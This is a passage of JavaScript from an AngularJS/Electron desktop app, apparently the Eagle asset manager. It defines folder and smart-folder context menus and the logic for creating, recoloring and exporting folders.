                        label: i18n.__("Context.Expand.All.Folders"),
                        icon: 'ic-expand-all.svg',
                        click: () => {
                            $scope.toggleAllFolderExpand(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // 克隆
                    {
                        disabled: disabled,
                        label: i18n.__('context.folder.clone'),
                        keywords: '複製 克隆 clone',
                        icon: 'ic-clone.svg',
                        click: () => {
                            $scope.cloneFolder(event, folder);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    {
                        role: 'separator'
                    },
                    // 導出
                    {
                        disabled: disabled,
                        icon: 'ic-export.svg',
                        label: i18n.__("context.folder.export"),
                        submenu: {
                            items: [
                                {
                                    disabled: disabled,
                                    label: i18n.__("context.folder.export>computer"),
                                    keywords: '導出 エクスポート 本地 export computer local',
                                    icon: 'ic-export-computer.svg',
                                    click: () => {
                                        $scope.folderExportAsFolder(event, folder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: disabled,
                                    label: i18n.__("context.folder.export>eaglepack"),
                                    keywords: '導出 エクスポート export eaglepack',
                                    icon: 'ic-export-eaglepack.svg',
                                    click: () => {
                                        $scope.folderExportAsPack(event, folder);
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    // 添加至資源庫
                    {
                        label: i18n.__('context.image.addToLibrary'),
                        keywords: '',
                        icon: 'ic-library-add-to.svg',
                        submenu: historyLibraryMenu
                    },
                    // ---
                    { role: 'separator' },
                    // 在父文件夾顯示子文件夾內容
                    {
                        checked: $scope.showSubfolderContent,
                        label: i18n.__('context.folder.toogleSubFolderContent'),
                        icon: 'ic-folder-show-sub-folder-content.svg',
                        click: () => {
                            $scope.showListSubfolderContent();
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    { role: 'separator' },
                    // emoji
                    {
                        label: i18n.__('context.folder.icon'),
                        icon: 'ic-emoji.svg',
                        submenu: {
                            items: [{
                                role: 'emoji',
                                click: (emoji) => {
                                    $scope.changeFolderIcon(event, folder, emoji);
                                }
                            }]
                        }
                    },
                    // color
                    {
                        role: 'color',
                        click: (color) => {
                            $scope.changeFolderColor(event, folder, color);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    // 刪除
                    {
                        role: 'separator'
                    },
                    {
                        accelerator: (process.platform === 'win32') ? 'Delete': 'CmdOrCtrl+⌫',
                        label: i18n.__("context.folder.remove"),
                        keywords: '資料夾 文件夾 刪除 移除 remove delete folder dir',
                        icon: 'ic-folder-remove.svg',
                        click: () => {
                            $scope.removeFolder(folder);
                            $scope.$evalAsync();
                        }
                    },
                ];
            }
            const $folder = $(event.delegateTarget);
            ContextMenu.open({
                items: items,
                showSearch: true,
                onOpened: () => {
                    $folder.addClass("context-activate");
                },
                onClosed: () => {
                    $folder.removeClass("context-activate");
                }
            });
        };

        $scope.openSmartFolderContextMenu = (event, smartFolder) => {

            if (event?.target?.tagName === 'INPUT') return;

            const isOpenQuickAccess = $rootScope.preferences.sidebar.quickAccess != 'false';
            const isAddedQuickAccess = QuickAccessManager.indexOf(smartFolder) > -1;
            const isMultiple = $rootScope.selectedSmartFoldersMappings[smartFolder.id];
            const selectedSmartFolders = $rootScope.selectedSmartFolders;

            let items = null;
            let historyLibraryMenu = {};

            historyLibraryMenu.items = $bodyScope.getLibraryHistory().filter((history) => {
                var isCurrent = false;
                if ($bodyScope.libraryPath) {
                    isCurrent = path.normalize(history.path) == path.normalize($bodyScope.libraryPath);
                }
                return !isCurrent;
            }).map((history) => {
                return {
                    label: history.name,
                    keywords: 'library 資源庫',
                    accelerator: history.dir,
                    icon: 'ic-library-logo.svg',
                    click: () => {
                        $rootScope.$broadcast("ADD_TO_LIBRARY", {
                            smartFolder, smartFolder,
                            items: [],
                            library: history
                        });
                        $scope.$evalAsync();
                    }
                }
            });

            if (isMultiple && selectedSmartFolders.length > 1) {

                // 當前的排序方式
                const currentOrder = selectedSmartFolders.reduce((prev, current) => {
                    return (prev?.orderBy === current?.orderBy) ? prev?.orderBy : undefined;
                });

                const currentOrderIncrease = selectedSmartFolders.reduce((prev, current) => {
                    return (prev?.sortIncrease === current?.sortIncrease) ? prev?.sortIncrease : undefined;
                });

                let defaultOrderItem = {
                    checked: !currentOrder,
                    label: i18n.__('context.order.orderBy>default'),
                    icon: 'ic-order-by.svg',
                    click: () => {
                        $scope.setSmartFoldersOrder(selectedSmartFolders, undefined);
                    }
                };

                let orderItems = ['import', 'mtime', 'btime', 'name', 'ext', 'filesize', 'resolution', 'rating', 'duration', 'random'].map((order) => {
                    const uppercase = order?.toUpperCase();
                    return {
                        checked: currentOrder === uppercase,
                        label: i18n.__(`context.order.orderBy>${order}`),
                        keywords: order,
                        icon: `ic-order-by-${order}.svg`,
                        click: () => {
                            $scope.setSmartFoldersOrder(selectedSmartFolders, uppercase || undefined);
                        }
                    }
                });

                let increaseItems = [
                    {
                        checked: currentOrderIncrease === true,
                        label: i18n.__('context.order.orderBy>increase'),
                        icon: 'ic-order-by-increase.svg',
                        click: () => {
                            $scope.setSmartFoldersSortIncrease(selectedSmartFolders, true)
                        }
                    },
                    {
                        checked: currentOrderIncrease === false,
                        label: i18n.__('context.order.orderBy>decrease'),
                        icon: 'ic-order-by-decrease.svg',
                        click: () => {
                            $scope.setSmartFoldersSortIncrease(selectedSmartFolders, false)
                        }
                    },
                ];

                let orderByItems = [defaultOrderItem, ...orderItems, { role: 'separator' }, ...increaseItems];

                items = [
                    // 修改排序
                    {
                        label: i18n.__('context.order.label.orderBy'),
                        icon: 'ic-order-by.svg',
                        submenu: {
                            items:orderByItems
                        }
                    },
                    // 添加到最愛 / 從最愛移除
                    {
                        visible: isOpenQuickAccess,
                        role: 'separator'
                    },
                    {
                        visible: isOpenQuickAccess && !isAddedQuickAccess,
                        label: i18n.__("context.smartFolder.quickAccessAdd"),
                        keywords: '最愛 加入 快速存取 add quick access favorite',
                        icon: "ic-favorite-add.svg",
                        click: () => {
                            QuickAccessManager.addMultiple('smartFolder', selectedSmartFolders);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess && isAddedQuickAccess,
                        label: i18n.__("context.smartFolder.quickAccessRemove"),
                        keywords: '最愛 移除 快速存取 remove quick access favorite',
                        icon: "ic-favorite-remove.svg",
                        click: () => {
                            QuickAccessManager.removeMultiple('smartFolder', selectedSmartFolders);
                            $scope.$evalAsync();
                        }
                    },
                    // 批次命名
                    {
                        accelerator: (process.platform === 'win32') ? 'F2': 'CmdOrCtrl+R',
                        label: i18n.__('context.image.batchRename.msg1') + selectedSmartFolders.length + i18n.__('context.image.batchRename.msg2'),
                        keywords: '重命名 重新命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            $scope.batchRenameSmartFolders(event);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // emoji
                    {
                        label: i18n.__('context.smartFolder.changeIcon'),
                        icon: 'ic-emoji.svg',
                        submenu: {
                            items: [{
                                role: 'emoji',
                                click: (emoji) => {
                                    $scope.changeSelectedSmartFoldersIcon(event, emoji);
                                }
                            }]
                        }
                    },
                    // color
                    {
                        role: 'color',
                        click: (color) => {
                            $scope.changeSelectedSmartFoldersColor(event, color);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    // 刪除
                    {
                        role: 'separator'
                    },
                    {
                        accelerator: (process.platform === 'win32') ? 'Delete': 'CmdOrCtrl+⌫',
                        label: i18n.__("context.smartFolder.removeFolder"),
                        keywords: '資料夾 文件夾 刪除 移除 remove delete smart folder dir',
                        icon: 'ic-smart-folder-remove.svg',
                        click: () => {
                            $scope.removeSelectedSmartFolders();
                            $scope.$evalAsync();
                        }
                    },
                ];
            }
            else {
                items = [
                    // 新增智能文件夾
                    {
                        label: i18n.__('context.smartFolder.newSmartFolder'),
                        keywords: '資料夾 文件夾 新建 建立 新增 智能 智慧 new create smart',
                        icon: 'ic-smart-folder-new.svg',
                        click: function() {
                            $scope.newSmartFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 新增子文件夾
                    {
                        label: i18n.__('context.folder.newSubFolder'),
                        keywords: '資料夾 文件夾 新建 建立 新增 智能 智慧 子 smart folder dir new create sub child',
                        icon: 'ic-smart-folder-new-sub.svg',
                        click: function() {
                            $scope.newChildSmartFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 重命名
                    {
                        accelerator: (process.platform === 'win32') ? 'F2': 'CmdOrCtrl+R',
                        label: i18n.__('context.smartFolder.renameFolder'),
                        keywords: '重命名 重新命名 rename',
                        icon: 'ic-rename.svg',
                        click: () => {
                            $scope.renameSmartFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 修改規則
                    {
                        accelerator: 'CmdOrCtrl+Shift+R',
                        label: i18n.__('context.smartFolder.editRules'),
                        keywords: '規則 修改 編輯 edit rule',
                        icon: 'ic-smart-folder-rule.svg',
                        click: () => {
                            $scope.settingFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 克隆
                    {
                        label: i18n.__('context.smartFolder.clone'),
                        keywords: '複製 克隆 clone',
                        icon: 'ic-clone.svg',
                        click: () => {
                            $scope.cloneSmartFolder(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 複製連結
                    {
                        label: i18n.__('appmenu.edit>copyAsLink'),
                        keywords: '複製 連結 copy link',
                        icon: 'ic-copy-link.svg',
                        click: () => {
                            $scope.copySmartFolderLink(event, smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // 刷新
                    {
                        label: i18n.__('context.order.refresh'),
                        keywords: '刷新 重新載入 refresh reload',
                        icon: 'ic-refresh.svg',
                        click: () => {
                            $scope.refreshSmartFolderCount(event);
                            $scope.$evalAsync();
                        }
                    },
                    // 添加到最愛 / 從最愛移除
                    {
                        visible: isOpenQuickAccess,
                        role: 'separator'
                    },
                    {
                        visible: isOpenQuickAccess && !isAddedQuickAccess,
                        label: i18n.__("context.smartFolder.quickAccessAdd"),
                        keywords: '最愛 加入 快速存取 add quick access favorite',
                        icon: "ic-favorite-add.svg",
                        click: () => {
                            QuickAccessManager.add('smartFolder', smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        visible: isOpenQuickAccess && isAddedQuickAccess,
                        label: i18n.__("context.smartFolder.quickAccessRemove"),
                        keywords: '最愛 移除 快速存取 remove quick access favorite',
                        icon: "ic-favorite-remove.svg",
                        click: () => {
                            QuickAccessManager.remove('smartFolder', smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    {
                        role: 'separator'
                    },
                    // 導出
                    {
                        icon: 'ic-export.svg',
                        label: i18n.__("context.smartFolder.export"),
                        submenu: {
                            items: [
                                {
                                    label: i18n.__("context.smartFolder.export>computer"),
                                    keywords: '導出 エクスポート 本地 export computer local',
                                    icon: 'ic-export-computer.svg',
                                    click: () => {
                                        $scope.smartFolderExportAsFolder(event, smartFolder);
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__("context.smartFolder.export>eaglepack"),
                                    keywords: '導出 エクスポート export eaglepack',
                                    icon: 'ic-export-eaglepack.svg',
                                    click: () => {
                                        $scope.smartFolderExportAsPack(event, smartFolder);
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    // 添加至資源庫
                    {
                        label: i18n.__('context.image.addToLibrary'),
                        keywords: '',
                        icon: 'ic-library-add-to.svg',
                        submenu: historyLibraryMenu
                    },
                    // ---
                    // emoji
                    {
                        label: i18n.__('context.smartFolder.changeIcon'),
                        icon: 'ic-emoji.svg',
                        submenu: {
                            items: [{
                                role: 'emoji',
                                click: (emoji) => {
                                    $scope.changeSmartFolderIcon(event, smartFolder, emoji);
                                }
                            }]
                        }
                    },
                    // color
                    {
                        role: 'color',
                        click: (color) => {
                            $scope.changeSmartFolderColor(event, smartFolder, color);
                            $scope.$evalAsync();
                        }
                    },
                    // ---
                    // 刪除
                    {
                        role: 'separator'
                    },
                    {
                        accelerator: (process.platform === 'win32') ? 'Delete': 'CmdOrCtrl+⌫',
                        label: i18n.__("context.smartFolder.removeFolder"),
                        keywords: '資料夾 文件夾 刪除 移除 remove delete smart folder dir',
                        icon: 'ic-smart-folder-remove.svg',
                        click: () => {
                            $scope.removeSmartFolder(smartFolder);
                            $scope.$evalAsync();
                        }
                    },
                ];
            }

            const $smartFolder = $(event.delegateTarget);
            ContextMenu.open({
                items: items,
                showSearch: true,
                onOpened: () => {
                    $smartFolder.addClass("context-activate");
                },
                onClosed: () => {
                    $smartFolder.removeClass("context-activate");
                }
            });
        };

        $scope.openNewSmartFolderContextMenu = (event) => {
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('appmenu.file>createSmartFolder'),
                        icon: 'ic-smart-folder-new.svg',
                        accelerator: preferences.shortcuts.keybinds['create.smartFolder'],
                        click: () => {
                            $scope.newSmartFolder(event);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        label: i18n.__('appmenu.file>createSmartFolderGroup'),
                        icon: 'ic-smart-folder-new-group.svg',
                        click: () => {
                            var smartFolderGroup = $scope.newSmartFolderGroup(event);
                            $scope.openSmartFolder(smartFolderGroup);
                            $timeout(function () {
                                $scope.renameSmartFolder(event, smartFolderGroup);
                            }, 150);
                            $scope.$evalAsync();
                        }
                    }
                ],
                showSearch: false,
            });
        };

        $scope.newSmartFolder = function (event, smartFolder) {
            $rootScope.$broadcast('NEW.SMART.FOLDER', { smartFolder: smartFolder, parent: undefined });
        };

        $scope.newChildSmartFolder = function (event, smartFolder) {
            $rootScope.$broadcast('NEW.SMART.FOLDER', { smartFolder: smartFolder || $scope.currentSmartFolder, parent: smartFolder });
        };

        $scope.newSmartFolderGroup = function (event) {
        	var smartFolderGroup = {
                "id": guid(),
                "name": i18n.__("general.untitled.title"),
                "modificationTime": Date.now(),
                "children": [],
                "conditions": [],
                "icon": "grid"
            };
        	$scope.smartFolders.push(smartFolderGroup);
        	$scope.updateSidebarList();
        	$scope.saveFolder();
        	analytics.event('SmartFolder', 'CreateGroup');
        	return smartFolderGroup;
        }

        $scope.prependFolder = function(folder) {

            $scope.folders.unshift(folder);
            $scope.folderMappings[folder.id] = folder;
            $scope.updateSidebarList();
            setTimeout(function() {
                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                    $scope.saveFolder();
                });
            }, 1000);

        };

        $scope.changeFolderIcon = function (event, folder, icon) {
            if (!icon) {
                delete folder.icon;
            }
            else {
                folder.icon = icon;
            }
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change folder: ${folder.name}(${folder.id}) icon to: ${icon}`); } catch (err) {};
            analytics.event('ChangeIcon', 'Folder', icon);
        };

        $scope.changeSelectedFoldersIcon = function (event, icon) {
            if ($rootScope.selectedFolders.length === 0) return;
            $rootScope.selectedFolders.forEach(function (folder) {
                if (!icon) {
                    delete folder.icon;
                }
                else {
                    folder.icon = icon;
                }
            });
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change ${$rootScope.selectedFolders.length} folders icon to: ${icon}`); } catch (err) {};
            analytics.event('ChangeIcon', 'Folder', icon);
        };

        $scope.changeImagesBackground = function (images, color) {
            if (!images || images.length === 0) return;
            for (let i = 0; i < images.length; i++) {
                var image = images[i];
                if (!color) {
                    delete image.background;
                }
                else {
                    image.background = color;
                }   
            }
            ayncsImagesChange(images);
            $scope.updateItemsView($scope.selected);
            try { electronLog && electronLog.info(`[app] Change ${images.length} files thumbnail background to: ${color}`); } catch (err) {};
        };

        $scope.changeSelectedSmartFoldersIcon = function (event, icon) {
            if ($rootScope.selectedSmartFolders.length === 0) return;
            $rootScope.selectedSmartFolders.forEach(function (smartFolder) {
                if (!icon) {
                    delete smartFolder.icon;
                }
                else {
                    smartFolder.icon = icon;
                }
            });
            $scope.updateSidebarList();
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change ${$rootScope.selectedSmartFolders.length} smart-folders icon to: ${icon}`); } catch (err) {};
            analytics.event('ChangeIcon', 'SmartFolder', icon);
        };

        $scope.changeFolderColor = function (event, folder, color) {
            if (!color) {
                delete folder.iconColor;
            }
            else {
                folder.iconColor = color;
            }
            $scope.updateSidebarList();
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change folder: ${folder.name}(${folder.id}) icon color to: ${color}`); } catch (err) {};
            analytics.event('ChangeColor', 'Folder', color);
        };

        $scope.changeSelectedFoldersColor = function (event, color) {
            if ($rootScope.selectedFolders.length === 0) return;
            $rootScope.selectedFolders.forEach(function (folder) {
                if (!color) {
                    delete folder.iconColor;
                }
                else {
                    folder.iconColor = color;
                }
            });
            $scope.updateSidebarList();
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change ${$rootScope.selectedFolders.length} folders icon color to: ${color}`); } catch (err) {};
            analytics.event('ChangeColor', 'Folder', color);
        };

        $scope.changeSelectedSmartFoldersColor = function (event, color) {
            if ($rootScope.selectedSmartFolders.length === 0) return;
            $rootScope.selectedSmartFolders.forEach(function (smartFolder) {
                if (!color) {
                    delete smartFolder.iconColor;
                }
                else {
                    smartFolder.iconColor = color;
                }
            });
            $scope.updateSidebarList();
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change ${$rootScope.selectedSmartFolders.length} smart-folders icon color to: ${color}`); } catch (err) {};
            analytics.event('ChangeColor', 'SmartFolder', color);
        };

        $scope.folderExportAsPack = function (event, folder) {
            var images = [];
            var f = {};
            for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                try {
                    var image = $scope.raw[rindex];
                    if (image.isDeleted) continue;
                    var isContain = image.folders.indexOf(folder.id) > -1;
                    if (!isContain) {
                        eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                            if (image.folders.indexOf(child.id) > -1) {
                                isContain = true;
                                return;
                            }
                        });
                    }
                    if (isContain) {
                        images.push(image);
                    }
                }
                catch (err) {}
            }
            angular.extend(f, folder);
            f.images = images;
            var defaultPath = path.join("*/", 'Untitled' + '.eaglepack');
            if (folder) {
                defaultPath = path.join("*/", folder.name.replace(/^\./, "") + '.eaglepack');
            }

            dialog.showSaveDialog(currentWindow, {
                defaultPath: defaultPath,
                title: i18n.__('Context.Image.Export'),
                filters: [{ name: 'Eagle Package File', extensions: ['eaglepack'] }]
            }).then(result => {
                var savePath = result.filePath;
                if (!savePath) return;
                if (backgroundWindowID === undefined) {
                    IPCHelper.send('export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
                else {
                    IPCHelper.sendTo(backgroundWindowID, 'export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
            });            
        }

        $scope.folderExportAsFolder = function (event, folder) {

            var folders = $rootScope.selectedFolders;
            if (folder) {
                folders = [folder];
            }
            else {
                if ($rootScope.selectedFolders.length === 0) return;
                folders = $rootScope.selectedFolders;
            }
            
            var exportFolder = function (folder, savePath) {
                var images = [];
                if (savePath) {
                    for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                        try {
                            var image = $scope.raw[rindex];
                            if (image.isDeleted) continue;
                            var isContain = image.folders.indexOf(folder.id) > -1;
                            if (!isContain) {
                                eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                                    if (image.folders.indexOf(child.id) > -1) {
                                        isContain = true;
                                        return;
                                    }
                                });
                            }
                            if (isContain && !$scope.lockedImages[image.id]) {
                                images.push(image);
                            }
                        }
                        catch (err) {}
                    }
                    var folderName = folder.name.replace(/[@$%^*<>:'"\/\\|?*]+/g, '').replace(/\//g, " ").replace(/\\/g," ").replace(/%/g, "");
                    var folderDir = path.normalize(savePath + "/" + folderName);
                    if (fs.existsSync(folderDir)) {

                        var message = $filter('i18n')("Dialog.Folder.Export.As.Folder.Message", [
                            { "property": "folderDir", "value": folderDir }
                        ]);

                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__("Dialog.Folder.Export.As.Folder.Title")}</h4>
                                    <p class="alert-desc">${message}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("Dialog.Folder.Export.As.Folder.Button"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            if (backgroundWindowID === undefined) {
                                IPCHelper.send('export-as-folder', {
                                    folder: folder,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                            else {
                                IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                    folder: folder,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                        });
                    }
                    else {
                        if (backgroundWindowID === undefined) {
                            IPCHelper.send('export-as-folder', {
                                folder: folder,
                                images: images,
                                savePath: savePath
                            });
                        }
                        else {
                            IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                folder: folder,
                                images: images,
                                savePath: savePath
                            });
                        }
                    }
                }
            };
            $scope.exportFolder(function (savePath) {
                folders.forEach(function (folder) {
                    exportFolder(folder, savePath);    
                })
            });
        }

        $scope.smartFolderExportAsPack = function (event, smartFolder) {

            var isInSmartFolder = function (sf, image) {
                if (sf.children && sf.children.length === 0 && sf.conditions && sf.conditions.length === 0) {
                    return false;
                }
                else if (sf.children && sf.children.length > 0 && sf.conditions && sf.conditions.length === 0) {
                    for (let i = 0; i < sf.children.length; i++) {
                        let smartFolder = sf.children[i];
                        if ($scope.existInSmartFilter(smartFolder, image)) {
                            return true;
                        }
                    }
                    return false;
                }
                else {
                    return $scope.existInSmartFilter($scope.currentSmartFolder, image);
                }
            };

            var f = {};
            var folderId = guid();
            var images = [];
            for (var i = 0; i < $scope.raw.length; i++) {
                var image = $scope.raw[i];
                if (image.isDeleted) continue;
                if (isInSmartFolder(smartFolder, image)) {
                    var clone = {};
                    angular.extend(clone, image);
                    clone.folders = [folderId];
                    images.push(clone);
                }
            }
            if (images.length === 0) return;
            angular.extend(f, smartFolder);
            f.id = folderId;
            f.images = images;
            delete f.children;

            var defaultPath = path.join("*/", 'Untitled' + '.eaglepack');
            if (smartFolder) {
                defaultPath = path.join("*/", smartFolder.name.replace(/^\./, "") + '.eaglepack');
            }

            dialog.showSaveDialog(currentWindow, {
                defaultPath: defaultPath,
                title: i18n.__('Context.Image.Export'),
                filters: [{ name: 'Eagle Package File', extensions: ['eaglepack'] }]
            }).then(result => {
                var savePath = result.filePath;
                if (!savePath) return;
                if (backgroundWindowID === undefined) {
                    IPCHelper.send('export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
                else {
                    IPCHelper.sendTo(backgroundWindowID, 'export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
            });    
        }

        $scope.smartFolderExportAsFolder = function(event, smartFolder) {

            var isInSmartFolder = function (sf, image) {
                if (sf.children && sf.children.length === 0 && sf.conditions && sf.conditions.length === 0) {
                    return false;
                }
                else if (sf.children && sf.children.length > 0 && sf.conditions && sf.conditions.length === 0) {
                    for (let i = 0; i < sf.children.length; i++) {
                        let smartFolder = sf.children[i];
                        if ($scope.existInSmartFilter(smartFolder, image)) {
                            return true;
                        }
                    }
                    return false;
                }
                else {
                    return $scope.existInSmartFilter($scope.currentSmartFolder, image);
                }
            };

            $scope.exportFolder(function (savePath) {
                var f = {};
                var folderId = guid();
                var images = [];
                if (savePath) {
                    for (var i = 0; i < $scope.raw.length; i++) {
                        var image = $scope.raw[i];
                        if (image.isDeleted) continue;
                        if (isInSmartFolder(smartFolder, image)) {
                            var clone = {};
                            angular.extend(clone, image);
                            clone.folders = [folderId];
                            images.push(clone);
                        }
                    }
                    if (images.length === 0) return;
                    angular.extend(f, smartFolder);
                    f.id = folderId;
                    f.images = images;
                    delete f.children;
                    var folderDir = path.normalize(savePath + "/" + smartFolder.name.replace(/\//g, " ").replace(/\\/g," ").replace(/%/g, ""));
                    if (fs.existsSync(folderDir)) {

                        var message = $filter('i18n')("Dialog.Folder.Export.As.Folder.Message", [
                            { "property": "folderDir", "value": folderDir }
                        ]);

                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__("Dialog.Folder.Export.As.Folder.Title")}</h4>
                                    <p class="alert-desc">${message}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("Dialog.Folder.Export.As.Folder.Button"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            if (backgroundWindowID === undefined) {
                                IPCHelper.send('export-as-folder', {
                                    folder: f,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                            else {
                                IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                    folder: f,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                        });
                    }
                    else {
                        if (backgroundWindowID === undefined) {
                            IPCHelper.send('export-as-folder', {
                                folder: f,
                                images: images,
                                savePath: savePath
                            });
                        }
                        else {
                            IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                folder: f,
                                images: images,
                                savePath: savePath
                            });
                        }
                    }
                }
            });
        }

        $scope.moveFolders = function (selectedFolders, node) {
            var selected = (selectedFolders?.length > 0)? selectedFolders: [node];
            if (selected && selected.length > 0) {
                $rootScope.$broadcast("OPEN-MOVE-FOLDER-MODAL", {
                    current: $scope.currentFolder,
                    folders: $scope.folders,
                    selectedFolders: selected
                });
            }
        };

        $scope.newFolderWidthSelection = () => {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon create"></div>
                        <h4 class="alert-title">${i18n.__("dialog.createFolderWithItems.title")}</h4>
                        <p class="alert-desc">${i18n.__("dialog.createFolderWithItems.desc")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.createFolderWithItems.createBtn"),
                cancelButtonText: i18n.__("general.cancel"),
                input: 'text',
                inputPlaceholder: "",
                inputValue: '',
                inputValidator: function (value) {
                    return new Promise(function (resolve, reject) {
                        if (value && !/[@#$%^&*<>:'"\/\\|?*]+/.test(value)) {
                           resolve()
                        } else {
                            reject($filter('i18n')('Dialog.CreateLibrary.Error'))
                        }
                    })
                },
            }).then(function (folderName) {
                var folderId = guid();
                var folder = {
                    id: folderId,
                    name: folderName,
                    images: [],
                    folders: [],
                    modificationTime: Date.now(),
                    editable: false,
                    imagesMappings: {},
                    tags: [],
                    children: [],
                    isExpand: true,
                };
                $scope.folders.splice($scope.folders.length, 0, folder);
                $scope.folderMappings[folder.id] = folder;
                $scope.updateSidebarList();
                $scope.addToRecentFolders([folder.id]);

                // 添加圖片
                $scope.selected.forEach(function(image) {
                    if (!image.folders) image.folders = [];
                    image.folders.push(folderId);
                });
                ayncsImagesChange($scope.selected);
                hiddenByCurrentFilter($scope.selected);
                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                    $scope.rebindRefresh();
                });
                $scope.openFolder(folder);
                setTimeout(function() {
                    $scope.saveFolder();
                }, 1000);
                electronLog && electronLog.info(`[app] Create new folder ${folder.name}(${folder.id}) with ${$scope.selected.length} files`);
                analytics.event('Folder', 'Create-With-Images', folder.name);
            });
        };

        $scope.newSubFolder = function () {
            if (!$scope.currentFolder) return;
            $scope.newFolder($scope.currentFolder, true);
        };

        $scope.createFolder = ({ name, parentID, sibling, position = "top", callback }) => {

            if (name === undefined) return;

            const folderId = guid();
            const folder = {
                id: folderId,
                name: name,
                folders: [],
	            modificationTime: Date.now(),
	            editable: false,
	            tags: [],
	            children: [],
	            isExpand: true,
            };

            if (parentID) {
                folder.parent = parentID;
            }

            // 兄弟模式
            if (sibling) {
                const siblingParent = $scope.folderMappings[sibling.parent];
                let index;
                if (siblingParent) {
                    index = siblingParent.children.indexOf(sibling);
                    if (index === -1) index = siblingParent.children.length - 1;
                    siblingParent.children.splice(index + 1, 0, folder);
                }
                else {
                    index = $scope.folders.indexOf(sibling);
                    if (index === -1) index = $scope.folders.length - 1;
                    $scope.folders.splice(index + 1, 0, folder);
                }
            }
            // 添加成為孩子
            else if (parentID) {
                const parent = $scope.folderMappings[parentID];
                if (parent) {
                    parent.children.splice(0, 0, folder);
                }
            }
            // 添加在第一層
            else {
                if (position === "top") {
                    $scope.folders.splice(0, 0, folder);
                }
                else if (position === "bottom") {
                    $scope.folders.splice($scope.folders.length, 0, folder);
                }
            }

            $scope.folderMappings[folder.id] = folder;
            $scope.addToRecentFolders([folder.id]);
            $scope.updateSidebarList();
            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.refreshSubfolderList();
                $scope.saveFolder();
                if (callback) callback(folder);
                if (folder.parent) {
                    electronLog && electronLog.info(`[app] New sub-folder: ${folder.id}, parent: ${folder.parent}`);
                }
                else {
                    electronLog && electronLog.info(`[app] New folder: ${folder.id}`);
                }
                analytics.event('Folder', 'Create');
            });
        };

        $scope.newFolder = function(parent, isSubFolder, isSiblingFolder, ignoreAutoOpen) {

            var folderId = guid();
            var folder = {
                id: folderId,
                name: $filter('i18n')('general.untitled.folder'),
                images: [],
                folders: [],
                modificationTime: Date.now(),
                editable: true,
                imagesMappings: {},
                tags: [],
                children: [],
                isExpand: true,
            };

            // 预设状态：新增同级文件夹
            // 若带有参数 parent 则新增子文件夹
            if (isSiblingFolder) {
                var father = $scope.folderMappings[parent.parent];
                var children = (father && father.children) ? father.children : $scope.folders;
                var idx = children.indexOf(parent);
                // 创建兄弟文件夹，如果目标及目标父文件夹相同，继承文件夹颜色、图标设置
                if (father) {
